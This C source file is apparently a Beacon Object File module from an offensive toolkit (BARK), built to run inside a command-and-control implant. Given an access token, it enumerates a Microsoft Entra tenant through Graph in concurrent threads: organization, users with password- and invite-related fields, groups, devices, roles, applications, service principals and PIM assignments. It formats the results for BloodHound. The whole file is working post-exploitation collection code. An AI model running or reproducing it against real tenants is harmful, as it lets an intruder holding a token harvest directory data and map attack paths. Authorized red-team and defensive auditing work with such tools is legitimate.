/*
 * get_entra_core_bh.c - BARK BOF
 * Collect independent core Entra Graph entities concurrently.
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"
#include "../../include/edge_collection.h"

typedef struct {
    const char *token;
    LPCWSTR path;
    const char *kind;
    const char *suffix;
} CoreJob;

static DWORD WINAPI CoreWorker(LPVOID parameter)
{
    CoreJob *job = (CoreJob *)parameter;
    if (MSVCRT$strcmp(job->kind, "AZUser") == 0)
        BarkGetBHUsersWithPassword(job->token, job->path, job->suffix);
    else
        BarkGetBHInner(L"graph.microsoft.com", job->path, job->token,
            job->kind, job->suffix);
    return 0;
}

void go(char *args, int alen)
{
    datap parser;
    char *token = NULL;
    char *tenantId = NULL;
    char *tenantName = NULL;
    char suffix[1024];
    char tenantSuffix[1536];
    int i;

    BeaconDataParse(&parser, args, alen);
    token = BeaconDataExtract(&parser, NULL);
    g_use_download = BeaconDataInt(&parser);
    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Usage: bark_get_entra_core_bh <token>\n");
        return;
    }

    tenantId = BarkExtractTidFromJWT(token);
    tenantName = BarkFetchTenantDisplayName(token);
    MSVCRT$sprintf_s(suffix, sizeof(suffix),
        "\"tenantId\":\"%s\",\"tenantName\":\"%s\"",
        tenantId ? tenantId : "", tenantName ? tenantName : "");
    MSVCRT$sprintf_s(tenantSuffix, sizeof(tenantSuffix),
        "\"id\":\"/tenants/%s\",\"tenantId\":\"%s\","
        "\"tenantType\":\"AAD\",\"collected\":true,\"tenantName\":\"%s\"",
        tenantId ? tenantId : "", tenantId ? tenantId : "",
        tenantName ? tenantName : "");

    CoreJob jobs[] = {
        { token,
          L"/v1.0/organization?$select=displayName,verifiedDomains,countryLetterCode,createdDateTime",
          "AZTenant", NULL },
        { token,
          L"/beta/users?$top=999&$select=id,deletedDateTime,accountEnabled,ageGroup,businessPhones,city,createdDateTime,creationType,companyName,consentProvidedForMinor,country,department,displayName,employeeId,employeeHireDate,employeeLeaveDateTime,employeeType,faxNumber,givenName,imAddresses,infoCatalogs,isHardDeleteProtectionEnabled,isLicenseReconciliationNeeded,isManagementRestricted,isResourceAccount,jobTitle,lastPasswordChangeDateTime,legalAgeGroupClassification,mail,mailNickname,mobilePhone,onPremisesDistinguishedName,officeLocation,onPremisesDomainName,onPremisesImmutableId,onPremisesLastSyncDateTime,onPremisesObjectIdentifier,onPremisesSecurityIdentifier,onPremisesSamAccountName,onPremisesSyncEnabled,onPremisesUserPrincipalName,otherMails,passwordPolicies,postalCode,preferredDataLocation,preferredLanguage,proxyAddresses,refreshTokensValidFromDateTime,securityIdentifier,showInAddressList,signInSessionsValidFromDateTime,state,streetAddress,surname,usageLocation,userPrincipalName,externalUserConvertedOn,externalUserState,externalUserStateChangeDateTime,userType,identityParentId,agentIdentityBlueprintId,isProvisionedToOnPremises,identityProfileIds,employeeOrgData,inviteTicket,passwordProfile,assignedLicenses,assignedPlans,authorizationInfo,cloudRealtimeCommunicationInfo,deviceKeys,identities,onPremisesExtensionAttributes,onPremisesProvisioningErrors,onPremisesSipInfo,provisionedPlans,serviceProvisioningErrors",
          "AZUser", NULL },
        { token, L"/beta/groups?$count=true", "AZGroup", NULL },
        { token, L"/beta/devices?$count=true", "AZDevice", NULL },
        { token, L"/v1.0/roleManagement/directory/roleDefinitions",
          "AZRole", NULL },
        { token, L"/beta/applications?$count=true", "AZApp", NULL },
        { token, L"/beta/servicePrincipals?$count=true", "AZServicePrincipal", NULL }
    };
    HANDLE threads[sizeof(jobs) / sizeof(jobs[0])];
    MSVCRT$memset(threads, 0, sizeof(threads));

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Get-EntraCoreBH: collecting %d independent Graph families concurrently\n",
        (int)(sizeof(jobs) / sizeof(jobs[0])));
    for (i = 0; i < (int)(sizeof(jobs) / sizeof(jobs[0])); i++) {
        jobs[i].suffix = (i == 0) ? tenantSuffix : suffix;
        threads[i] = KERNEL32$CreateThread(NULL, 0, CoreWorker,
            &jobs[i], 0, NULL);
        if (!threads[i]) {
            /* A Beacon may temporarily reject a new worker while another
             * collector is creating its own request threads. Keep the handle
             * slot NULL before falling back synchronously; never wait on an
             * uninitialised stack value. */
            threads[i] = NULL;
            CoreWorker(&jobs[i]);
        }
    }
    for (i = 0; i < (int)(sizeof(jobs) / sizeof(jobs[0])); i++) {
        if (threads[i]) {
            KERNEL32$WaitForSingleObject(threads[i], INFINITE);
            KERNEL32$CloseHandle(threads[i]);
        }
    }
    BarkCollectEntraPIM(token, tenantId);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Get-EntraCoreBH complete\n");
    BeaconPrintf(CALLBACK_OUTPUT,
        "[BARK/v5] all-info collector complete: core\n");

    if (tenantId) HFree(tenantId);
    if (tenantName) HFree(tenantName);
}
